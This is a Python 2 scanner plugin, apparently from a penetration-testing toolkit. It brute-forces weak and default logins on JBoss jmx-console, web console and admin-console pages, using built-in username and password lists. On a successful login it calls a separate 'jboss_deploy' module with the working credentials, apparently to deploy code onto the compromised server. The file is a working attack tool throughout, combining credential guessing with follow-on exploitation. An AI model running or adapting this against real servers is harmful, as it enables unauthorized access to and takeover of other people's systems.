#coding=utf-8
#author:wolf@future-sec
import base64
import re
import urllib
import urllib2
def check(host,port,timeout):
    url = "http://%s:%d"%(host,int(port))
    error_i = 0
    flag_list=['>jboss.j2ee</a>','JBoss JMX Management Console','HtmlAdaptor?action=displayMBeans','<title>JBoss Management']
    user_list=['admin','manager','jboss','root']
    pass_list=['','admin','123456','12345678','123456789','admin123','admin888','password','admin1','administrator','8888888','123123','admin','manager','root','jboss']
    for user in user_list:
        for password in pass_list:
            try:
                login_url = url+'/jmx-console'
                request = urllib2.Request(login_url)
                auth_str_temp=user+':'+password
                auth_str=base64.b64encode(auth_str_temp)
                request.add_header('Authorization', 'Basic '+auth_str)
                res = urllib2.urlopen(request,timeout=timeout)
                res_code = res.code
                res_html = res.read()
            except urllib2.HTTPError,e:
                res_code = e.code
                res_html = e.read()
            except urllib2.URLError,e:
                error_i+=1
                if error_i >= 3:
                    return 'NO'
                continue
            if int(res_code) == 404:
                break
            if int(res_code) == 401:
                continue
            for flag in flag_list:
                if flag in res_html:
                    info='%s Jboss Weak password %s:%s'%(login_url,user,password)
                    #login_cookie = res.headers['Set-Cookie']
                    deploy = __import__("jboss_deploy")
                    re = deploy.run(host,port,timeout,'Basic '+auth_str)
                    if re:
                        info += re
                    return 'YES|'+info
    for user in user_list:
        for password in pass_list:
            try:
                login_url = url+'/console/App.html'
                request = urllib2.Request(login_url)
                auth_str_temp=user+':'+password
                auth_str=base64.b64encode(auth_str_temp)
                request.add_header('Authorization', 'Basic '+auth_str)
                res = urllib2.urlopen(request,timeout=timeout)
                res_code = res.code
                res_html = res.read()
            except urllib2.HTTPError,e:
                res_code = e.code
            except urllib2.URLError,e:
                error_i+=1
                if error_i >= 3:
                    return 'NO'
                continue
            if int(res_code) == 404:
                break
            if int(res_code) == 401:
                continue
            for flag in flag_list:
                if flag in res_html:
                    info='%s Jboss Weak password %s:%s'%(login_url,user,password)
                    deploy = __import__("jboss_deploy")
                    re = deploy.run(host,port,timeout,'Basic '+auth_str)
                    if re:
                        info += re
                    return 'YES|'+info
    for user in user_list:
        for password in pass_list:
            try:
                login_url = url+'/admin-console/login.seam'
                res_html = urllib2.urlopen(login_url).read()
                if '"http://jboss.org/embjopr/"' in res_html:
                    key_str=re.search('javax.faces.ViewState\" value=\"(.*?)\"',res_html)
                    key_hash=urllib.quote(key_str.group(1))
                    PostStr="login_form=login_form&login_form:name=%s&login_form:password=%s&login_form:submit=Login&javax.faces.ViewState=%s"%(user,password,key_hash)
                    request = urllib2.Request(login_url,PostStr)
                    res = urllib2.urlopen(request,timeout=timeout)
                    if 'admin-console/secure/summary.seam' in res.read():
                        info = "%s Jboss Weak password %s:%s"%(login_url,user,password)
                        return 'YES|' + info
            except:
                return 'NO'
    return 'NO'